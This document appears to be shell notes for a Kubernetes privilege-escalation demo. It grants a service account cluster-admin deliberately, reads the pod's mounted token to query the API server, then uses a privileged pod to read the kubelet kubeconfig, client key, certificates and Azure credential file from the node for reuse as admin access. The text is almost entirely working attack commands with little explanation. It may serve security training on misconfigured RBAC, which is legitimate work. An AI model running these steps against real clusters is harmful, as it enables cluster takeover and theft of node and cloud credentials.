
```bash
 k create ns rbac-sample-ns
 kubens rbac-sample-ns
 k create serviceaccount rbac-sample-sa --dry-run=true -o yaml > service-account.yaml
 k apply -f service-account.yaml
 k get sa
 
```

```
default          1         4m31s
rbac-sample-sa   1         68s
```


```bash
k create clusterrolebinding misconfigured-cluter-rolebinding --clusterrole cluster-admin --serviceaccount=rbac-sample-ns:rbac-sample-sa
k run nginx --image=nginx --restart=Always --serviceaccount=rbac-sample-sa --env="app=nginx" --labels="app=nginx" --dry-run=true -o yaml > nginx-deployment.yaml
k apply -f nginx-deployment.yaml
k exec -it $(kubectl get pods --no-headers -o custom-columns=":metadata.name") -- /bin/bash
cd ~/
curl -LO "https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl
./kubectl get pods -A
./kubectl get pods
./kubectl get pod $(./kubectl get pods --no-headers -o custom-columns=":metadata.name")
./kubectl run nginx --image=nginx --restart=Never 
./kubectl delete pod nginx

ls /proc/1/cgroup
mount | grep kubernetes
cd /run/secrets/kubernetes.io/serviceaccount
export TOKEN=`cat /run/secrets/kubernetes.io/serviceaccount/token`
curl --header "Authorization: Bearer $TOKEN" -k https:///$KUBERNETES_SERVICE_HST:443/api/v1/namespaces/default/pods -v 
kubectl auth can-i create pod
kubectl auth can-i create namespace
kubectl auth can-i create service
```


```
#copy privileged-pod.yaml into container 
kubectl apply -f privileged-pod.yaml
k exec -it privileged -- /bin/bash
apt-get update && apt-get install -y procps 
ps -ef | grep kubelet
#copy on your local-machine   --kubeconfig=/var/lib/kubelet/kubeconfig  
#       --client-ca-file=/etc/kubernetes/certs/ca.crt
#        
cat /data/var/lib/kubelet/kubeconfig
cat /data/etc/kubernetes/certs/client.key
cat /data/etc/kubernetes/certs/client.crt
cat  /data/etc/kubernetes/certs/ca.crt
cat  /data/etc/kubernetes/azure.json
cat  /data/etc/kubernetes/azure.json

exit
#assume you copy these files into under folder kube-hack-config
kubectl --kubeconfig=./kube-hack-config/kubeconfig get nodes
```

```
On Managed kubernetes cluster, it is possible to extract IAM or Service Principal from a node. 
```